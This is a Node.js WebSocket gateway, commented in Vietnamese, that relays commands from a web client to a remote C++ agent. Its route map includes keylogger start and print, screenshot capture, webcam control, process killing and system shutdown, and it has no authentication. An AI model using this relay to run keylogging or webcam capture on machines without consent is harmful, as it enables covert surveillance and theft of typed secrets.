const WebSocket = require('ws');

// Cấu hình Server
const PORT = 8080;
const wss = new WebSocket.Server({ port: PORT, maxPayload: 50 * 1024 * 1024 });

console.log(`Gateway đang chạy tại ws://localhost:${PORT}`);

let webClient = null;
let agentClient = null;
let activeContext = null; 

// BẢNG ĐỊNH TUYẾN (ROUTE MAP)
const ROUTE_MAP = {
    // --- APP ---
    '/application/list':  { command: 'APPLICATION', action: 'XEM' },
    '/application/kill':  { command: 'APPLICATION', action: 'KILL' },
    '/application/start': { command: 'APPLICATION', action: 'START' },
    '/application/quit':  { command: 'APPLICATION', action: 'QUIT' },

    // --- PROCESS ---
    '/process/list':  { command: 'PROCESS', action: 'XEM' },
    '/process/kill':  { command: 'PROCESS', action: 'KILL' },
    '/process/start': { command: 'PROCESS', action: 'START' },
    '/process/quit':  { command: 'PROCESS', action: 'QUIT' },

    // --- KEYLOGGER ---
    '/keylog/start': { command: 'KEYLOG', action: 'HOOK' },
    '/keylog/stop':  { command: 'KEYLOG', action: 'UNHOOK' },
    '/keylog/print': { command: 'KEYLOG', action: 'PRINT' },
    '/keylog/quit':  { command: 'KEYLOG', action: 'QUIT' },

    // --- SCREENSHOT (TAKEPIC) ---
    '/screenshot/take': { command: 'TAKEPIC', action: 'TAKE' },
    '/screenshot/quit': { command: 'TAKEPIC', action: 'QUIT' },

    // --- WEBCAM ---
    '/webcam/start': { command: 'WEBCAM', action: 'START' },
    '/webcam/stop':  { command: 'WEBCAM', action: 'STOP' },
    '/webcam/quit':  { command: 'WEBCAM', action: 'QUIT' },

    // --- SYSTEM ---
    '/shutdown': { command: 'SHUTDOWN' },
    '/restart':  { command: 'RESTART' }
};

wss.on("connection", (ws) => {
    ws.role = "unknown";

    ws.on("message", (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            console.log("Lỗi JSON:", message);
            return;
        }

        // 1. ĐĂNG KÝ
        if (data.type === "register") {
            ws.role = data.role;
            if (ws.role === "web_client") {
                webClient = ws;
                console.log("Web Client đã kết nối.");
            } else if (ws.role === "agent" || ws.role === "cpp_server") {
                agentClient = ws;
                console.log("Agent C++ đã kết nối.");
                activeContext = null; 
            }
            return;
        }

        // 2. WEB CLIENT GỬI LỆNH
        if (ws === webClient) {
            if (!agentClient) {
                ws.send(JSON.stringify({ type: 'ERROR', data: 'Agent chưa online!' }));
                return;
            }

            const endpoint = data.endpoint;
            const params = data.params || {};
            const route = ROUTE_MAP[endpoint];

            if (route) {
                const targetCommand = route.command;

                // TỰ ĐỘNG CHUYỂN NGỮ CẢNH (AUTO QUIT)
                if (activeContext && activeContext !== targetCommand) {
                    // Nếu là Shutdown/Restart thì không cần Quit ngữ cảnh cũ, cứ thế mà tắt máy
                    if (targetCommand !== 'SHUTDOWN' && targetCommand !== 'RESTART') {
                        console.log(`🔄 Auto-Quit: [${activeContext}]`);
                        agentClient.send(JSON.stringify({ command: activeContext, action: 'QUIT' }));
                    }
                }

                // Cập nhật ngữ cảnh
                if (['SHUTDOWN', 'RESTART'].includes(targetCommand)) {
                    activeContext = null;
                } else if (route.action === 'QUIT') {
                    activeContext = null;
                } else {
                    activeContext = targetCommand;
                }

                const finalPacket = { ...route, ...params };
                console.log(`Routing [${endpoint}] -> Agent:`, JSON.stringify(finalPacket));
                agentClient.send(JSON.stringify(finalPacket));
            }
        }

        // 3. AGENT GỬI PHẢN HỒI
        else if (ws === agentClient) {
            if (webClient) webClient.send(message);
        }
    });

    ws.on('close', () => {
        if (ws === agentClient) {
            console.log("Agent mất kết nối.");
            agentClient = null; activeContext = null;
        }
        if (ws === webClient) {
            console.log("Web Client thoát.");
            webClient = null;
        }
    });
});